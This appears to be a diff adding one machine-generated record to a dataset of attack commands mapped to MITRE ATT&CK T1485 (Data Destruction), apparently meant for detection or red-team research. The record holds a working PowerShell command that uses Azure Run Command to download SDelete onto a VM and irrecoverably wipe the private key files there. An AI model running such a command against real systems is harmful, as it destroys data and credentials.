@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Keys' -Name 'WinVM-Keys' -CommandId 'RunPowerShellScript' -ScriptString \"Set-Location $env:TEMP; Invoke-WebRequest https://download.sysinternals.com/files/SDelete.zip -OutFile sdelete.zip; Expand-Archive -Path sdelete.zip -DestinationPath . -Force; & .\\sdelete.exe -accepteula -p 3 -s -q 'C:\\Keys\\*.pem' 'C:\\Keys\\*.pfx'\"",
+  "explanation": "Fetches SDelete and securely overwrites and deletes private key files (.pem, .pfx) in C:\\Keys on a Windows VM.",
+  "rationale_steps": [
+    "Identify sensitive key file patterns in the targeted folder.",
+    "Use SDelete with multiple passes to overwrite and remove the files irrevocably."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-e7bbd23c",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
